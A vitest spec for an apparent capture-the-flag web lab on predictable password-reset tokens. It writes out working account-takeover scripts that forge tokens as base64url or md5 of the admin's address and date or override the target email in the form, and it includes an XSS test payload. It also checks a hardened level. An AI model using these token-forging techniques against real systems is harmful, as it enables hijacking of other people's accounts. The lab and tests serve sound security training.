// src/districts/gatekeeper/gk-08-predictable-reset-token/gk-08.spec.ts
import { createHash } from 'node:crypto';
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import { FLAG_RE, describeExploitMatrix, freshSession, unescapeHtml, type Agent } from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { describeOddBodies, describeSignInView } from '../../_shared/victim-lab.testkit.js';
import { GK08 } from './challenge.js'; // registers GK-08 before createApp() inside freshSession
import { ADMIN_EMAIL, PLAYER_EMAIL, labState } from './model.js';

const LAB = '/d/gatekeeper/predictable-reset-token';
const ADMIN = 'citadel_admin';
const TAKEN = 'taken-over-1';
/** The lab clock the matrix pins (noon UTC: far from the midnight Templar's per-day token turns over at). */
const PINNED = Date.UTC(2026, 10, 16, 12, 0, 0);

type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;

// --- The player's moves --------------------------------------------------------------------------------------------
const home = (a: Agent, l: Level) => a.get(`${LAB}?level=${l}`);
const signIn = (a: Agent, l: Level, username: string, password: string) =>
  a.post(`${LAB}?level=${l}`).type('form').send({ username, password });
const forgot = (a: Agent, l: Level, email: string) => a.post(`${LAB}/forgot?level=${l}`).type('form').send({ email });
const resetWith = (a: Agent, l: Level, form: Record<string, string>) =>
  a.post(`${LAB}/reset?level=${l}`).type('form').send(form);

/** The reset links in the player's mailbox, newest first, unescaped. */
const mailLinks = (html: string): string[] =>
  [...html.matchAll(/<a class="mail-link" href="([^"]*)"/g)].map((m) => unescapeHtml(m[1]));
/** The delivery times of the mails in the player's mailbox, newest first (ISO, UTC). */
const mailTimes = (html: string): string[] =>
  [...(/<ol class="lab-mailbox"[\s\S]*?<\/ol>/.exec(html)?.[0] ?? '').matchAll(/<time datetime="([^"]*)"/g)].map((m) => m[1]);
const linkParam = (link: string | undefined, name: string): string =>
  link === undefined ? '' : new URL(link, 'http://lab.invalid').searchParams.get(name) ?? '';

/** Request a reset for yourself and read the newest link from your mailbox. */
async function ownLink(a: Agent, l: Level): Promise<string | undefined> {
  await forgot(a, l, PLAYER_EMAIL);
  return mailLinks((await home(a, l)).text)[0];
}

const b64url = (s: string): string => Buffer.from(s, 'utf8').toString('base64url');
const md5 = (s: string): string => createHash('md5').update(s).digest('hex');

// --- The exploits ----------------------------------------------------------------------------------------------------
// Acolyte: the token is the address itself, base64url-encoded. Ask for the admin's reset, then write the token yourself.
const acolyteExploit: Script = async (a, l) => {
  await forgot(a, l, ADMIN_EMAIL);
  await resetWith(a, l, { token: b64url(ADMIN_EMAIL), password: TAKEN });
  return signIn(a, l, ADMIN, TAKEN);
};

// Templar: md5(address + today's date). Your own reset mail shows the date the server goes by.
const templarExploit: Script = async (a, l) => {
  await ownLink(a, l);
  const day = (mailTimes((await home(a, l)).text)[0] ?? '').slice(0, 10);
  await forgot(a, l, ADMIN_EMAIL);
  await resetWith(a, l, { token: md5(`${ADMIN_EMAIL}${day}`), password: TAKEN });
  return signIn(a, l, ADMIN, TAKEN);
};

// Inquisitor: a strong token, but the form says whose password changes. Use your own token with the admin's address.
const inquisitorExploit: Script = async (a, l) => {
  const token = linkParam(await ownLink(a, l), 'token');
  await resetWith(a, l, { token: token || 'none', email: ADMIN_EMAIL, password: TAKEN });
  return signIn(a, l, ADMIN, TAKEN);
};

/** The honest flow: ask for your own reset, open the link, fill in the form the page shows, sign in with the new password. */
const honestReset: Script = async (a, l) => {
  const link = await ownLink(a, l);
  const form = await a.get(link ?? `${LAB}/reset?level=${l}`);
  const email = /<input name="email" type="text"[^>]*value="([^"]*)"/.exec(form.text)?.[1];
  await resetWith(a, l, {
    token: linkParam(link, 'token'), password: 'fresh-pass-1', ...(email === undefined ? {} : { email: unescapeHtml(email) }),
  });
  return signIn(a, l, 'pilgrim', 'fresh-pass-1');
};

describeExploitMatrix<Script>({
  challenge: GK08,
  path: LAB,
  // The lab clock is pinned: Templar's token is per UTC day, and a run across midnight would split it.
  send: (agent, level, script, _url, { sid }) => { labState(sid, level).now = () => PINNED; return script(agent, level, sid); },
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: 'Invalid username or password.',
  legit: [
    { name: 'own account pilgrim/pilgrim', input: (a, l) => signIn(a, l, 'pilgrim', 'pilgrim'), expect: 'Welcome, pilgrim' },
    { name: 'reset your own password from your mailbox', input: honestReset, expect: 'Welcome, pilgrim' },
  ],
  malformed: [], // no query and no parser: nothing that can raise a database error
  privileged: {
    name: 'the real admin password',
    input: (a, l, sid) => signIn(a, l, ADMIN, labState(sid, l).members.find((m) => m.username === ADMIN)!.password),
    expect: /Welcome, citadel_admin/,
  },
});

describeSignInView({ challenge: GK08, path: LAB });
describeOddBodies({ challenge: GK08, path: LAB, forms: ['/forgot', '/reset'] });

describe('GK-08 token schemes', () => {
  it('acolyte: the token is base64url(address)', async () => {
    const { agent } = await freshSession();
    expect(linkParam(await ownLink(agent, 'acolyte'), 'token')).toBe(b64url(PLAYER_EMAIL));
  });

  it('templar: the token is md5(address + the UTC date of the request), from the lab clock', async () => {
    const { agent, sid } = await freshSession();
    const state = labState(sid, 'templar');
    state.now = () => Date.UTC(2026, 10, 16, 23, 59, 0);
    expect(linkParam(await ownLink(agent, 'templar'), 'token')).toBe(md5(`${PLAYER_EMAIL}2026-11-16`));
    state.now = () => Date.UTC(2026, 10, 17, 0, 1, 0);
    expect(linkParam(await ownLink(agent, 'templar'), 'token')).toBe(md5(`${PLAYER_EMAIL}2026-11-17`));
    expect(mailTimes((await home(agent, 'templar')).text)[0]).toBe('2026-11-17T00:01:00.000Z');
  });

  it('inquisitor: random tokens, and the reset form asks whose password to change', async () => {
    const { agent } = await freshSession();
    const a = linkParam(await ownLink(agent, 'inquisitor'), 'token');
    const b = linkParam(await ownLink(agent, 'inquisitor'), 'token');
    expect(a).toMatch(/^[0-9a-f]{32}$/);
    expect(b).not.toBe(a);
    const link = mailLinks((await home(agent, 'inquisitor')).text)[0];
    expect(linkParam(link, 'email')).toBe(PLAYER_EMAIL);
    const form = await agent.get(link);
    expect(form.text).toContain(`<input name="email" type="text" autocomplete="off" spellcheck="false" value="${PLAYER_EMAIL}">`);
  });

  it('only inquisitor\'s form has an email field; the other levels take the account from the token', async () => {
    for (const level of ['acolyte', 'templar', 'divine'] as const) {
      const { agent } = await freshSession();
      const link = await ownLink(agent, level);
      expect(linkParam(link, 'email'), level).toBe('');
      expect((await agent.get(link!)).text, level).not.toContain('name="email"');
    }
  });

  it('divine: 32 random bytes (base64url), stored only as a SHA-256 hash, never repeated', async () => {
    const { agent, sid } = await freshSession();
    const seen = new Set<string>();
    for (let i = 0; i < 5; i++) seen.add(linkParam(await ownLink(agent, 'divine'), 'token'));
    expect(seen.size).toBe(5);
    const stored = [...labState(sid, 'divine').resets.keys()];
    for (const token of seen) {
      expect(token).toMatch(/^[A-Za-z0-9_-]{43}$/);
      expect(stored).not.toContain(token);
      expect(JSON.stringify([...labState(sid, 'divine').resets])).not.toContain(token);
    }
    const newest = [...seen].at(-1)!;
    expect(stored).toContain(createHash('sha256').update(newest).digest('hex'));
  });
});

describe('GK-08 divine: bound, single-use, 15-minute links', () => {
  it('a token is used once', async () => {
    const { agent } = await freshSession();
    const token = linkParam(await ownLink(agent, 'divine'), 'token');
    expect((await resetWith(agent, 'divine', { token, password: 'one-1' })).text).toContain('Password updated for pilgrim.');
    const again = await resetWith(agent, 'divine', { token, password: 'two-2' });
    expect(again.text).toContain('This reset link is invalid or has expired.');
    expect((await signIn(agent, 'divine', 'pilgrim', 'one-1')).text).toContain('Welcome, pilgrim');
  });

  it('a token expires after 15 minutes (the lab clock)', async () => {
    const { agent, sid } = await freshSession();
    const state = labState(sid, 'divine');
    const t0 = Date.UTC(2026, 10, 16, 12, 0, 0);
    state.now = () => t0;
    const fresh = linkParam(await ownLink(agent, 'divine'), 'token');
    const stale = linkParam(await ownLink(agent, 'divine'), 'token');
    state.now = () => t0 + 15 * 60_000 - 1;
    expect((await resetWith(agent, 'divine', { token: fresh, password: 'in-time-1' })).text).toContain('Password updated for pilgrim.');
    state.now = () => t0 + 15 * 60_000;
    expect((await resetWith(agent, 'divine', { token: stale, password: 'too-late-1' })).text).toContain('This reset link is invalid or has expired.');
  });

  it('the account comes from the token, never from the form', async () => {
    const { agent, sid } = await freshSession();
    const token = linkParam(await ownLink(agent, 'divine'), 'token');
    const admin = labState(sid, 'divine').members.find((m) => m.username === ADMIN)!;
    const before = admin.password;
    const res = await resetWith(agent, 'divine', { token, email: ADMIN_EMAIL, password: TAKEN });
    expect(res.text).toContain('Password updated for pilgrim.');
    expect(admin.password).toBe(before);
  });
});

describe('GK-08 flows', () => {
  it('inquisitor: your own token resets whichever address the form names, once', async () => {
    const { agent, sid } = await freshSession();
    const token = linkParam(await ownLink(agent, 'inquisitor'), 'token');
    const res = await resetWith(agent, 'inquisitor', { token, email: ADMIN_EMAIL, password: TAKEN });
    expect(res.text).toContain('Password updated for citadel_admin.');
    expect(labState(sid, 'inquisitor').members.find((m) => m.username === ADMIN)!.password).toBe(TAKEN);
    expect((await resetWith(agent, 'inquisitor', { token, email: ADMIN_EMAIL, password: 'x-2' })).text)
      .toContain('This reset link is invalid or has expired.');
    const flag = await signIn(agent, 'inquisitor', ADMIN, TAKEN);
    expect(flag.text).toMatch(FLAG_RE);
  });

  it('acolyte and templar: a forged token works only once a reset was requested for that account', async () => {
    for (const level of ['acolyte', 'templar'] as const) {
      const { agent, sid } = await freshSession();
      labState(sid, level).now = () => PINNED; // the test and the server must agree on the day
      const day = new Date(PINNED).toISOString().slice(0, 10);
      const token = level === 'acolyte' ? b64url(ADMIN_EMAIL) : md5(`${ADMIN_EMAIL}${day}`);
      expect((await resetWith(agent, level, { token, password: TAKEN })).text, level).toContain('This reset link is invalid or has expired.');
      await forgot(agent, level, ADMIN_EMAIL);
      expect((await resetWith(agent, level, { token, password: TAKEN })).text, level).toContain('Password updated for citadel_admin.');
    }
  });

  it('the forgot-password answer is the same for every address (no account enumeration)', async () => {
    for (const level of LEVELS) {
      const { agent } = await freshSession();
      const answers: (string | undefined)[] = [];
      for (const email of [PLAYER_EMAIL, ADMIN_EMAIL, 'nobody@citadel.test', '', ' CITADEL_ADMIN@citadel.test ']) {
        answers.push(/<p class="lab-message[^"]*"[^>]*>([^<]*)<\/p>/.exec((await forgot(agent, level, email)).text)?.[1]);
      }
      expect(new Set(answers).size, level).toBe(1);
      expect(answers[0], level).toBe('If an account uses that address, a reset link is on its way.');
    }
  });

  it('the address is matched without case or surrounding spaces', async () => {
    const { agent } = await freshSession();
    await forgot(agent, 'acolyte', '  PILGRIM@Citadel.Test ');
    expect(linkParam(mailLinks((await home(agent, 'acolyte')).text)[0], 'token')).toBe(b64url(PLAYER_EMAIL));
  });

  it('the admin\'s reset mail never reaches your mailbox, and the page never shows the admin\'s token', async () => {
    for (const level of LEVELS) {
      const { agent, sid } = await freshSession();
      await forgot(agent, level, ADMIN_EMAIL);
      const page = await home(agent, level);
      expect(mailLinks(page.text), level).toEqual([]);
      expect(page.text, level).toContain('No mail yet.');
      for (const key of labState(sid, level).resets.keys()) expect(page.text, level).not.toContain(key);
    }
  });

  it('a reset needs a new password, and an empty one does not use up the token', async () => {
    const { agent } = await freshSession();
    const token = linkParam(await ownLink(agent, 'divine'), 'token');
    const empty = await resetWith(agent, 'divine', { token, password: '' });
    expect(empty.text).toContain('Choose a new password');
    expect(empty.text).toMatch(/class="lab-message lab-error"/);
    expect((await resetWith(agent, 'divine', { token, password: 'later-1' })).text).toContain('Password updated for pilgrim.');
  });

  it('the old password stops working after a reset', async () => {
    const { agent } = await freshSession();
    await honestReset(agent, 'templar', '');
    expect((await signIn(agent, 'templar', 'pilgrim', 'pilgrim')).text).toContain('Invalid username or password.');
  });

  it('isolates players and levels: a reset in one lab changes nothing in another', async () => {
    const a = await freshSession();
    const b = await freshSession(a.app);
    await acolyteExploit(a.agent, 'acolyte', a.sid);
    expect((await signIn(b.agent, 'acolyte', ADMIN, TAKEN)).text).toContain('Invalid username or password.');
    expect((await signIn(a.agent, 'templar', ADMIN, TAKEN)).text).toContain('Invalid username or password.');
    expect((await signIn(a.agent, 'acolyte', ADMIN, TAKEN)).text).toMatch(FLAG_RE);
    // A token from one player's lab means nothing in another's (Divine: only a hash, per lab).
    const token = linkParam(await ownLink(a.agent, 'divine'), 'token');
    expect((await resetWith(b.agent, 'divine', { token, password: 'x-1' })).text).toContain('This reset link is invalid or has expired.');
  });

  it('the mailbox, the reset tokens and every other per-player list stay bounded', async () => {
    const { agent, sid } = await freshSession();
    for (let i = 0; i < 30; i++) await forgot(agent, 'inquisitor', i % 2 === 0 ? PLAYER_EMAIL : ADMIN_EMAIL);
    const state = labState(sid, 'inquisitor');
    expect(state.mailbox.length).toBeLessThanOrEqual(10);
    expect(state.resets.size).toBeLessThanOrEqual(20);
    expect(mailLinks((await home(agent, 'inquisitor')).text).length).toBeLessThanOrEqual(10);
  });
});

describe('GK-08 lab view specifics', () => {
  it('links are absolute lab paths with the level, and the mail link opens the reset form', async () => {
    const { agent } = await freshSession();
    const page = await home(agent, 'templar');
    expect(page.text).toContain(`href="${LAB}/forgot?level=templar"`);
    const link = await ownLink(agent, 'templar');
    expect(link).toMatch(new RegExp(`^${LAB}/reset\\?token=[0-9a-f]{32}&level=templar$`));
    const form = await agent.get(link!);
    expect(form.status).toBe(200);
    expect(form.text).toContain(`value="${linkParam(link, 'token')}"`);
    expect(form.text).not.toMatch(/<form[^>]*\saction=/);
  });

  it('the forgot and reset pages keep what you typed, escaped', async () => {
    const { agent } = await freshSession();
    const payload = '"><script>alert(1)</script>';
    for (const [path, name] of [['/forgot', 'email'], ['/reset', 'token']] as const) {
      const res = await agent.post(`${LAB}${path}?level=inquisitor`).type('form').send({ [name]: payload, password: 'x' });
      expect(res.text, path).toContain('value="&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"');
      expect(res.text, path).not.toContain('<script>alert(1)');
    }
  });

  it('tells the target account and its address', async () => {
    const { agent } = await freshSession();
    const page = await home(agent, 'acolyte');
    expect(page.text).toContain(`<code>${ADMIN_EMAIL}</code>`);
    expect(page.text).toContain(`<code>${PLAYER_EMAIL}</code>`);
  });
});
